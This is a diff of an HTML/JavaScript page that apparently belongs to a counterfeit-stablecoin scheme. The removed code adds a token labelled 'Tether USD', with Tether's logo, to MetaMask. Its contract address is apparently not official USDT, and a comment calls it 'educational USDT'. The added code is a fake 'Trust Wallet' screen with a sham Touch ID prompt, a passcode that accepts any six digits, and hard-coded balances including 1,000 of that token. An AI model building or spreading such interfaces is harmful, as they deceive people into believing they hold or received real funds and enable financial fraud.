+                    <path d="M12 15C13.6569 15 15 13.6569 15 12C15 10.3431 13.6569 9 12 9C10.3431 9 9 10.3431 9 12C9 13.6569 10.3431 15 12 15Z" stroke="#5F6C78" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M19.4 15C19.2669 15.3016 19.2272 15.6362 19.286 15.9606C19.3448 16.285 19.4995 16.5843 19.73 16.82L19.79 16.88C19.976 17.0657 20.1235 17.2863 20.2241 17.5291C20.3248 17.7719 20.3766 18.0322 20.3766 18.295C20.3766 18.5578 20.3248 18.8181 20.2241 19.0609C20.1235 19.3037 19.976 19.5243 19.79 19.71C19.6043 19.896 19.3837 20.0435 19.1409 20.1441C18.8981 20.2448 18.6378 20.2966 18.375 20.2966C18.1122 20.2966 17.8519 20.2448 17.6091 20.1441C17.3663 20.0435 17.1457 19.896 16.96 19.71L16.9 19.65C16.6643 19.4195 16.365 19.2648 16.0406 19.206C15.7162 19.1472 15.3816 19.1869 15.08 19.32C14.7842 19.4468 14.532 19.6572 14.3543 19.9255C14.1766 20.1938 14.0813 20.5082 14.08 20.83V21C14.08 21.5304 13.8693 22.0391 13.4942 22.4142C13.1191 22.7893 12.6104 23 12.08 23C11.5496 23 11.0409 22.7893 10.6658 22.4142C10.2907 22.0391 10.08 21.5304 10.08 21V20.91C10.0723 20.579 9.96512 20.258 9.77251 19.9887C9.5799 19.7194 9.31074 19.5143 9 19.4C8.69838 19.2669 8.36381 19.2272 8.03941 19.286C7.71502 19.3448 7.41568 19.4995 7.18 19.73L7.12 19.79C6.93425 19.976 6.71368 20.1235 6.47088 20.2241C6.22808 20.3248 5.96783 20.3766 5.705 20.3766C5.44217 20.3766 5.18192 20.3248 4.93912 20.2241C4.69632 20.1235 4.47575 19.976 4.29 19.79C4.10405 19.6043 3.95653 19.3837 3.85588 19.1409C3.75523 18.8981 3.70343 18.6378 3.70343 18.375C3.70343 18.1122 3.75523 17.8519 3.85588 17.6091C3.95653 17.3663 4.10405 17.1457 4.29 16.96L4.35 16.9C4.58054 16.6643 4.73519 16.365 4.794 16.0406C4.85282 15.7162 4.81312 15.3816 4.68 15.08C4.55324 14.7842 4.34276 14.532 4.07447 14.3543C3.80618 14.1766 3.49179 14.0813 3.17 14.08H3C2.46957 14.08 1.96086 13.8693 1.58579 13.4942C1.21071 13.1191 1 12.6104 1 12.08C1 11.5496 1.21071 11.0409 1.58579 10.6658C1.96086 10.2907 2.46957 10.08 3 10.08H3.09C3.42099 10.0723 3.742 9.96512 4.0113 9.77251C4.28059 9.5799 4.48572 9.31074 4.6 9C4.73312 8.69838 4.77282 8.36381 4.714 8.03941C4.65519 7.71502 4.50054 7.41568 4.27 7.18L4.21 7.12C4.02405 6.93425 3.87653 6.71368 3.77588 6.47088C3.67523 6.22808 3.62343 5.96783 3.62343 5.705C3.62343 5.44217 3.67523 5.18192 3.77588 4.93912C3.87653 4.69632 4.02405 4.47575 4.21 4.29C4.39575 4.10405 4.61632 3.95653 4.85912 3.85588C5.10192 3.75523 5.36217 3.70343 5.625 3.70343C5.88783 3.70343 6.14808 3.75523 6.39088 3.85588C6.63368 3.95653 6.85425 4.10405 7.04 4.29L7.1 4.35C7.33568 4.58054 7.63502 4.73519 7.95941 4.794C8.28381 4.85282 8.61838 4.81312 8.92 4.68H9C9.29577 4.55324 9.54802 4.34276 9.72569 4.07447C9.90337 3.80618 9.99872 3.49179 10 3.17V3C10 2.46957 10.2107 1.96086 10.5858 1.58579C10.9609 1.21071 11.4696 1 12 1C12.5304 1 13.0391 1.21071 13.4142 1.58579C13.7893 1.96086 14 2.46957 14 3V3.09C14.0013 3.41179 14.0966 3.72618 14.2743 3.99447C14.452 4.26276 14.7042 4.47324 15 4.6C15.3016 4.73312 15.6362 4.77282 15.9606 4.714C16.285 4.65519 16.5843 4.50054 16.82 4.27L16.88 4.21C17.0657 4.02405 17.2863 3.87653 17.5291 3.77588C17.7719 3.67523 18.0322 3.62343 18.295 3.62343C18.5578 3.62343 18.8181 3.67523 19.0609 3.77588C19.3037 3.87653 19.5243 4.02405 19.71 4.21C19.896 4.39575 20.0435 4.61632 20.1441 4.85912C20.2448 5.10192 20.2966 5.36217 20.2966 5.625C20.2966 5.88783 20.2448 6.14808 20.1441 6.39088C20.0435 6.63368 19.896 6.85425 19.71 7.04L19.65 7.1C19.4195 7.33568 19.2648 7.63502 19.206 7.95941C19.1472 8.28381 19.1869 8.61838 19.32 8.92V9C19.4468 9.29577 19.6572 9.54802 19.9255 9.72569C20.1938 9.90337 20.5082 9.99872 20.83 10H21C21.5304 10 22.0391 10.2107 22.4142 10.5858C22.7893 10.9609 23 11.4696 23 12C23 12.5304 22.7893 13.0391 22.4142 13.4142C22.0391 13.7893 21.5304 14 21 14H20.91C20.5882 14.0013 20.2738 14.0966 20.0055 14.2743C19.7372 14.452 19.5268 14.7042 19.4 15Z" stroke="#5F6C78" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+                <div class="nav-label">Settings</div>
             </div>
         </div>
     </div>
     
-    <footer>
-        <p>© 2025 Blockchain Technology Lab</p>
-    </footer>
+    <!-- Token Detail Screen -->
+    <div class="token-detail" id="tokenDetail">
+        <div class="detail-header">
+            <button class="back-btn" id="backBtn">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M19 12H5" stroke="#5F6C78" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M12 19L5 12L12 5" stroke="#5F6C78" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </button>
+            <div class="detail-token-info">
+                <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT Logo" class="detail-token-icon" id="detailTokenIcon">
+                <div class="detail-token-name" id="detailTokenName">Tether USD</div>
+            </div>
+        </div>
+        
+        <div class="detail-price-section">
+            <div class="detail-price" id="detailPrice">$1.00</div>
+            <div class="detail-change">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M18 15L12 9L6 15" stroke="#05944F" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+                +0.01%
+            </div>
+        </div>
+        
+        <div class="detail-chart">
+            <div class="chart-placeholder">
+                <div class="chart-line"></div>
+            </div>
+        </div>
+        
+        <div class="detail-actions">
+            <button class="detail-action-btn send-btn">Send</button>
+            <button class="detail-action-btn receive-btn">Receive</button>
+        </div>
+        
+        <div class="detail-info">
+            <div class="info-item">
+                <div class="info-label">Your Balance</div>
+                <div class="info-value" id="detailBalance">1,000.00 USDT</div>
+            </div>
+            <div class="info-item">
+                <div class="info-label">Network</div>
+                <div class="info-value">BNB Smart Chain</div>
+            </div>
+            <div class="info-item">
+                <div class="info-label">Contract</div>
+                <div class="info-value" id="detailContract">0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c</div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Biometric Popup -->
+    <div class="biometric-popup" id="biometricPopup">
+        <div class="biometric-box">
+            <div class="biometric-title">Touch ID for "Trust Wallet"</div>
+            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTI4IiBoZWlnaHQ9IjEyOCIgdmlld0JveD0iMCAwIDEyOCAxMjgiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik02NCA4QzMzLjA3IDggOCAzMy4wNyA4IDY0QzggOTQuOTMgMzMuMDcgMTIwIDY0IDEyMEM5NC45MyAxMjAgMTIwIDk0LjkzIDEyMCA2NEMxMjAgMzMuMDcgOTQuOTMgOCA2NCA4Wk02NCAxMTJDMzcuNDkgMTEyIDE2IDkwLjUxIDE2IDY0QzE2IDM3LjQ5IDM3LjQ5IDE2IDY0IDE2QzkwLjUxIDE2IDExMiAzNy40OSAxMTIgNjRDMTEyIDkwLjUxIDkwLjUxIDExMiA2NCAxMTJaIiBmaWxsPSIjMzM3NUJCIi8+CjxwYXRoIGQ9Ik02NCAzNkM1Ni45MiAzNiA1MC4yNCAzOC40NyA0NCA0Mi45OVY0OC4wMUM1MC4yNCA0My40OSA1Ni45MiA0MSA2NCA0MUM4MS42NyA0MSA5NiA1NS4zMyA5NiA3M0M5NiA3OS4wNCA5NC4zOSA4NC43NSA5MS42NSA4OS42OUw5Ni43NyA5Mi43OUM5OS45NSA4Ni45OSAxMDEuOTMgODAuMTkgMTAxLjkzIDcyLjk5QzEwMiA1MS45NSA4NS4wNCAzNiA2NCAzNloiIGZpbGw9IiMzMzc1QkIiLz4KPHBhdGggZD0iTTUyIDczQzUyIDY2LjM3IDU3LjM3IDYxIDY0IDYxQzcwLjYzIDYxIDc2IDY2LjM3IDc2IDczQzc2IDc5LjYzIDcwLjYzIDg1IDY0IDg1QzU3LjM3IDg1IDUyIDc5LjYzIDUyIDczWiIgZmlsbD0iIzMzNzVCQiIvPgo8cGF0aCBkPSJNMzIgNzNDMzIgNzUuNTMgMzIuMyA3Ny45OSAzMi44NiA4MC4zNkwzOC40NSA3OC4zN0MzOC4wMSA3Ni42MSAzNy43OCA3NC44MyAzNy43OCA3Mi45OUMzNy43OCA1OC44IDQ5LjgxIDQ3IDY0IDQ3QzcwLjQxIDQ3IDc2LjI0IDQ5LjM1IDgwLjkxIDUzLjNMODUuNDcgNDguNzRDNzkuNTYgNDMuNjQgNzIuMTQgNDEgNjQgNDFDNDYuMzIgNDEgMzIgNTUuMzMgMzIgNzNaIiBmaWxsPSIjMzM3NUJCIi8+CjxwYXRoIGQ9Ik05MS42NSA4OS42OUM4NS44OCA5NyA3Ny40NCAxMDIgNjggMTAyQzUyLjU0IDEwMiAzOS43MiA5MS41NiAzNi4yOSA3Ny40MUwzMC40NCA3OC42OUMzNC42MiA5NS43OCA0OS44MiAxMDggNjggMTA4QzcxLjQzIDEwOCA3NC43NSAxMDcuNSA3Ny45MiAxMDYuNkM4NC45MSAxMDQuNTQgOTEuMDQgMTAwLjQ0IDk1LjY5IDk0LjkyTDkxLjY1IDg5LjY5WiIgZmlsbD0iIzMzNzVCQiIvPgo8L3N2Zz4K" alt="Fingerprint" class="fingerprint-icon">
+            <div class="biometric-message">Sign in with Touch ID</div>
+            <button class="biometric-btn" id="authBtn">Authenticate</button>
+            <button class="cancel-btn" id="cancelBiometricBtn">Cancel</button>
+        </div>
+    </div>
 
     <script>
-        // Token details
-        const TOKEN_ADDRESS = '0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c';
-        const TOKEN_SYMBOL = 'USDT';
-        const TOKEN_DECIMALS = 6;
-        const TOKEN_NAME = 'Tether USD';
-        const TOKEN_IMAGE = 'https://cryptologos.cc/logos/tether-usdt-logo.png';
-        const BSC_CHAIN_ID = '0x38'; // 56 in hex
+        // DOM Elements
+        const loadingScreen = document.getElementById('loadingScreen');
+        const lockScreen = document.getElementById('lockScreen');
+        const walletScreen = document.getElementById('walletScreen');
+        const tokenDetail = document.getElementById('tokenDetail');
+        const passcodeDots = document.getElementById('passcodeDots');
+        const biometricBtn = document.getElementById('biometricBtn');
+        const biometricPopup = document.getElementById('biometricPopup');
+        const authBtn = document.getElementById('authBtn');
+        const cancelBiometricBtn = document.getElementById('cancelBiometricBtn');
+        const tokensList = document.getElementById('tokensList');
+        const portfolioValue = document.getElementById('portfolioValue');
+        const backBtn = document.getElementById('backBtn');
+        const detailTokenIcon = document.getElementById('detailTokenIcon');
+        const detailTokenName = document.getElementById('detailTokenName');
+        const detailPrice = document.getElementById('detailPrice');
+        const detailBalance = document.getElementById('detailBalance');
+        const detailContract = document.getElementById('detailContract');
         
-        // DOM elements
-        const addTokenBtn = document.getElementById('addTokenBtn');
-        const retryBtn = document.getElementById('retryBtn');
-        const copyBtn = document.getElementById('copyBtn');
-        const contractAddressEl = document.getElementById('contractAddress');
-        const statusContainer = document.getElementById('statusContainer');
-        const successMessage = document.getElementById('successMessage');
-        const errorMessage = document.getElementById('errorMessage');
-        const errorText = document.getElementById('errorText');
-        const verificationSection = document.getElementById('verificationSection');
-        const verifyYesBtn = document.getElementById('verifyYesBtn');
-        const verifyNoBtn = document.getElementById('verifyNoBtn');
-        const troubleshootingSection = document.getElementById('troubleshootingSection');
-        const troubleshootRetryBtn = document.getElementById('troubleshootRetryBtn');
-        const tokenLogo = document.getElementById('tokenLogo');
-        const networkLogo = document.getElementById('networkLogo');
-        
-        // Step elements
-        const step1 = document.getElementById('step1');
-        const step2 = document.getElementById('step2');
-        const step3 = document.getElementById('step3');
-        const step4 = document.getElementById('step4');
-        const step1Icon = document.getElementById('step1Icon');
-        const step2Icon = document.getElementById('step2Icon');
-        const step3Icon = document.getElementById('step3Icon');
-        const step4Icon = document.getElementById('step4Icon');
+        // Sample token data (including your educational USDT)
+        const tokens = [
+            {
+                symbol: 'USDT',
+                name: 'Tether USD',
+                icon: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
+                balance: '1000.00',
+                price: '1.00',
+                change: '+0.01',
+                contract: '0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c',
+                network: 'BNB Smart Chain'
+            },
+            {
+                symbol: 'BNB',
+                name: 'BNB',
+                icon: 'https://cryptologos.cc/logos/bnb-bnb-logo.png',
+                balance: '1.5',
+                price: '475.23',
+                change: '+3.24',
+                contract: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
+                network: 'BNB Smart Chain'
+            },
+            {
+                symbol: 'BUSD',
+                name: 'Binance USD',
+                icon: 'https://cryptologos.cc/logos/binance-usd-busd-logo.png',
+                balance: '500.25',
+                price: '1.00',
+                change: '+0.00',
+                contract: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
+                network: 'BNB Smart Chain'
+            },
+            {
+                symbol: 'CAKE',
+                name: 'PancakeSwap',
+                icon: 'https://cryptologos.cc/logos/pancakeswap-cake-logo.png',
+                balance: '24.56',
+                price: '3.12',
+                change: '+1.67',
+                contract: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82',
+                network: 'BNB Smart Chain'
+            }
+        ];
         
         // Variables
-        let provider;
-        let signer;
-        let account;
-        let connected = false;
-        let currentStep = 0;
-        let retryCount = 0;
+        let passcode = "";
+        let currentToken = null;
         
-        // Initialize
+        // Initialize the app
         function init() {
-            // Hide status steps initially
-            statusContainer.style.display = 'none';
+            // Simulate loading
+            setTimeout(() => {
+                loadingScreen.style.display = 'none';
+                lockScreen.style.display = 'flex';
+            }, 2000);
             
-            // Check for image loading errors
-            tokenLogo.onerror = function() {
-                this.src = 'https://assets.coingecko.com/coins/images/325/small/Tether.png';
-            };
+            // Add tokens to the list
+            renderTokens();
             
-            networkLogo.onerror = function() {
-                this.src = 'https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png';
-            };
+            // Calculate portfolio value
+            calculatePortfolioValue();
             
-            // Copy contract address
-            copyBtn.addEventListener('click', function() {
-                const textToCopy = contractAddressEl.textContent;
-                navigator.clipboard.writeText(textToCopy).then(function() {
-                    copyBtn.textContent = 'Copied!';
-                    setTimeout(function() {
-                        copyBtn.textContent = 'Copy';
-                    }, 2000);
-                });
-            });
-            
-            // Add token button
-            addTokenBtn.addEventListener('click', startTokenAddProcess);
-            
-            // Retry button
-            retryBtn.addEventListener('click', function() {
-                retryCount++;
-                resetUI();
-                startTokenAddProcess(true);
-            });
-            
-            // Verification buttons
-            verifyYesBtn.addEventListener('click', function() {
-                showSuccess("Great! The token has been added successfully with the logo.");
-                verificationSection.style.display = 'none';
-            });
-            
-            verifyNoBtn.addEventListener('click', function() {
-                verificationSection.style.display = 'none';
-                troubleshootingSection.style.display = 'block';
-            });
-            
-            // Troubleshooting retry button
-            troubleshootRetryBtn.addEventListener('click', function() {
-                troubleshootingSection.style.display = 'none';
-                retryCount++;
-                resetUI();
-                startTokenAddProcess(true);
-            });
-            
-            // Check if already connected
-            if (typeof window.ethereum !== 'undefined' && window.ethereum.selectedAddress) {
-                account = window.ethereum.selectedAddress;
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                signer = provider.getSigner();
-                connected = true;
-            }
-            
-            // Listen for account changes
-            if (window.ethereum) {
-                window.ethereum.on('accountsChanged', function (accounts) {
-                    window.location.reload();
-                });
-                
-                window.ethereum.on('chainChanged', function (chainId) {
-                    window.location.reload();
-                });
-            }
+            // Setup event listeners
+            setupEventListeners();
         }
         
-        // Reset UI
-        function resetUI() {
-            successMessage.style.display = 'none';
-            errorMessage.style.display = 'none';
-            statusContainer.style.display = 'block';
-            addTokenBtn.style.display = 'none';
-            retryBtn.style.display = 'none';
-            verificationSection.style.display = 'none';
-            troubleshootingSection.style.display = 'none';
-            
-            // Reset steps
-            currentStep = 0;
-            step1.className = 'status-step';
-            step2.className = 'status-step';
-            step3.className = 'status-step';
-            step4.className = 'status-step';
-            step1Icon.className = 'step-icon';
-            step2Icon.className = 'step-icon';
-            step3Icon.className = 'step-icon';
-            step4Icon.className = 'step-icon';
-            step1Icon.innerHTML = '1';
-            step2Icon.innerHTML = '2';
-            step3Icon.innerHTML = '3';
-            step4Icon.innerHTML = '4';
-        }
-        
-        // Show success message
-        function showSuccess(message) {
-            successMessage.innerHTML = `<span class="success-icon">✓</span><div><strong>Success!</strong> ${message}</div>`;
-            successMessage.style.display = 'flex';
-            errorMessage.style.display = 'none';
-            addTokenBtn.style.display = 'none';
-            retryBtn.style.display = 'none';
-        }
-        
-        // Show error message
-        function showError(message) {
-            errorText.innerHTML = `<strong>Error!</strong> ${message}`;
-            errorMessage.style.display = 'flex';
-            successMessage.style.display = 'none';
-            addTokenBtn.style.display = 'none';
-            retryBtn.style.display = 'block';
-        }
-        
-        // Update step status
-        function updateStep(step, status, message) {
-            const stepEl = document.getElementById(`step${step}`);
-            const iconEl = document.getElementById(`step${step}Icon`);
-            const descEl = stepEl.querySelector('.step-description');
-            
-            // Reset previous active step
-            if (currentStep > 0 && currentStep !== step) {
-                const prevStepEl = document.getElementById(`step${currentStep}`);
-                if (prevStepEl.className === 'status-step active') {
-                    prevStepEl.className = 'status-step';
-                }
-            }
-            
-            currentStep = step;
-            
-            if (status === 'active') {
-                stepEl.className = 'status-step active';
-                iconEl.className = 'step-icon active';
-                iconEl.innerHTML = '<span class="loading-spinner" style="width: 12px; height: 12px; margin: 0;"></span>';
-            } else if (status === 'success') {
-                stepEl.className = 'status-step success';
-                iconEl.className = 'step-icon success';
-                iconEl.innerHTML = '✓';
-            } else if (status === 'error') {
-                stepEl.className = 'status-step error';
-                iconEl.className = 'step-icon error';
-                iconEl.innerHTML = '!';
-            }
-            
-            if (message) {
-                descEl.textContent = message;
-            }
-        }
-        
-        // Start token add process
-        async function startTokenAddProcess(isRetry = false) {
-            resetUI();
-            
-            try {
-                // Step 1: Connect wallet
-                updateStep(1, 'active', 'Connecting to your wallet...');
-                
-                // Check if provider exists
-                if (typeof window.ethereum === 'undefined') {
-                    updateStep(1, 'error', 'MetaMask not detected');
-                    showError('MetaMask extension not detected. Please install MetaMask and try again.');
-                    return;
-                }
-                
-                // Connect to wallet
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                if (!accounts || accounts.length === 0) {
-                    updateStep(1, 'error', 'Failed to connect wallet');
-                    showError('Failed to connect to your wallet. Please try again.');
-                    return;
-                }
-                
-                account = accounts[0];
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                signer = provider.getSigner();
-                connected = true;
-                
-                updateStep(1, 'success', 'Wallet connected successfully');
-                
-                // Step 2: Switch to BSC network
-                updateStep(2, 'active', 'Checking and switching network...');
-                
-                // Check current network
-                const network = await provider.getNetwork();
-                if (network.chainId !== 56) {
-                    try {
-                        // Try to switch to BSC
-                        await window.ethereum.request({
-                            method: 'wallet_switchEthereumChain',
-                            params: [{ chainId: BSC_CHAIN_ID }],
-                        });
-                        
-                        // Verify network switch
-                        const updatedNetwork = await provider.getNetwork();
-                        if (updatedNetwork.chainId !== 56) {
-                            updateStep(2, 'error', 'Failed to switch to BSC network');
-                            showError('Failed to switch to Binance Smart Chain. Please switch manually and try again.');
-                            return;
-                        }
-                    } catch (switchError) {
-                        if (switchError.code === 4902) {
-                            // BSC not added to wallet, suggest adding it
-                            try {
-                                await window.ethereum.request({
-                                    method: 'wallet_addEthereumChain',
-                                    params: [{
-                                        chainId: BSC_CHAIN_ID,
-                                        chainName: 'Binance Smart Chain',
-                                        nativeCurrency: {
-                                            name: 'BNB',
-                                            symbol: 'BNB',
-                                            decimals: 18
-                                        },
-                                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                                        blockExplorerUrls: ['https://bscscan.com/']
-                                    }]
-                                });
-                                
-                                // Verify network addition
-                                const updatedNetwork = await provider.getNetwork();
-                                if (updatedNetwork.chainId !== 56) {
-                                    updateStep(2, 'error', 'Failed to add BSC network');
-                                    showError('Failed to add Binance Smart Chain. Please add it manually and try again.');
-                                    return;
-                                }
-                            } catch (addError) {
-                                updateStep(2, 'error', 'Failed to add BSC network');
-                                showError('Failed to add Binance Smart Chain. Please try again or add it manually.');
-                                return;
-                            }
-                        } else {
-                            updateStep(2, 'error', 'Failed to switch to BSC network');
-                            showError('Failed to switch to Binance Smart Chain. Please try again.');
-                            return;
-                        }
-                    }
-                }
-                
-                updateStep(2, 'success', 'Connected to BSC network');
-                
-                // Step 3: Add token
-                updateStep(3, 'active', 'Adding token with logo...');
-                
-                // Different methods based on retry count
-                let wasAdded = false;
-                
-                if (isRetry && retryCount % 2 === 1) {
-                    // Alternative method - add with delayed execution
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                    
-                    wasAdded = await window.ethereum.request({
-                        method: 'wallet_watchAsset',
-                        params: {
-                            type: 'ERC20',
-                            options: {
-                                address: TOKEN_ADDRESS,
-                                symbol: TOKEN_SYMBOL,
-                                decimals: TOKEN_DECIMALS,
-                                image: TOKEN_IMAGE
-                            }
-                        }
+        // Setup event listeners
+        function setupEventListeners() {
+            // Numpad buttons
+            document.querySelectorAll('.numpad-btn').forEach(btn => {
+                if (btn.dataset.value) {
+                    btn.addEventListener('click', function() {
+                        handlePasscodeInput(btn.dataset.value);
                     });
+                }
+            });
+            
+            // Biometric button
+            biometricBtn.addEventListener('click', function() {
+                showBiometricPopup();
+            });
+            
+            // Biometric popup buttons
+            authBtn.addEventListener('click', function() {
+                biometricPopup.style.display = 'none';
+                unlockWallet();
+            });
+            
+            cancelBiometricBtn.addEventListener('click', function() {
+                biometricPopup.style.display = 'none';
+            });
+            
+            // Back button
+            backBtn.addEventListener('click', function() {
+                tokenDetail.style.display = 'none';
+            });
+        }
+        
+        // Handle passcode input
+        function handlePasscodeInput(digit) {
+            if (passcode.length < 6) {
+                passcode += digit;
+                updatePasscodeDots();
+                
+                if (passcode.length === 6) {
+                    // Any 6-digit code will work
+                    setTimeout(unlockWallet, 500);
+                }
+            }
+        }
+        
+        // Update passcode dots
+        function updatePasscodeDots() {
+            const dots = passcodeDots.querySelectorAll('.passcode-dot');
+            dots.forEach((dot, index) => {
+                if (index < passcode.length) {
+                    dot.classList.add('filled');
                 } else {
-                    // Standard method
-                    wasAdded = await window.ethereum.request({
-                        method: 'wallet_watchAsset',
-                        params: {
-                            type: 'ERC20',
-                            options: {
-                                address: TOKEN_ADDRESS,
-                                symbol: TOKEN_SYMBOL,
-                                decimals: TOKEN_DECIMALS,
-                                image: TOKEN_IMAGE
-                            }
-                        }
-                    });
+                    dot.classList.remove('filled');
                 }
-                
-                if (!wasAdded) {
-                    updateStep(3, 'error', 'Token addition was canceled');
-                    showError('You canceled the token addition. Please try again.');
-                    return;
-                }
-                
-                updateStep(3, 'success', 'Token added to wallet');
-                
-                // Step 4: Verify
-                updateStep(4, 'active', 'Verifying token was added...');
-                
-                // Add a delay for better UX
-                await new Promise(resolve => setTimeout(resolve, 1500));
-                
-                updateStep(4, 'success', 'Verification complete');
-                
-                // Show verification section
-                verificationSection.style.display = 'block';
-                
-            } catch (error) {
-                console.error('Error in token add process:', error);
-                
-                // Update current step with error
-                if (currentStep > 0) {
-                    updateStep(currentStep, 'error', error.message || 'An error occurred');
-                }
-                
-                showError(error.message || 'Failed to add token. Please try again.');
-            }
+            });
         }
         
-        // Initialize on load
-        window.addEventListener('load', init);
+        // Show biometric popup
+        function showBiometricPopup() {
+            biometricPopup.style.display = 'flex';
+        }
+        
+        // Unlock wallet
+        function unlockWallet() {
+            lockScreen.style.display = 'none';
+            walletScreen.style.display = 'flex';
+        }
+        
+        // Render tokens in the list
+        function renderTokens() {
+            tokensList.innerHTML = '';
+            
+            tokens.forEach(token => {
+                const tokenItem = document.createElement('div');
+                tokenItem.className = 'token-item';
+                tokenItem.innerHTML = `
+                    <img src="${token.icon}" alt="${token.name}" class="token-icon">
+                    <div class="token-details">
+                        <div class="token-name">${token.name}</div>
+                        <div class="token-balance">${token.balance} ${token.symbol}</div>
+                    </div>
+                    <div class="token-value">
+                        <div class="token-price">$${(token.balance * token.price).toFixed(2)}</div>
+                        <div class="token-percent">${token.change}%</div>
+                    </div>
+                `;
+                
+                // Add click event to show token detail
+                tokenItem.addEventListener('click', function() {
+                    showTokenDetail(token);
+                });
+                
+                tokensList.appendChild(tokenItem);
+            });
+        }
+        
+        // Calculate total portfolio value
+        function calculatePortfolioValue() {
+            let total = 0;
+            tokens.forEach(token => {
+                total += token.balance * token.price;
+            });
+            
+            portfolioValue.textContent = `$${total.toFixed(2)}`;
+        }
+        
+        // Show token detail
+        function showTokenDetail(token) {
+            currentToken = token;
+            
+            detailTokenIcon.src = token.icon;
+            detailTokenName.textContent = token.name;
+            detailPrice.textContent = `$${token.price}`;
+            detailBalance.textContent = `${token.balance} ${token.symbol}`;
+            detailContract.textContent = token.contract;
+            
+            tokenDetail.style.display = 'flex';
+        }
+        
+        // Start the app
+        init();
     </script>
 </body>
 </html>
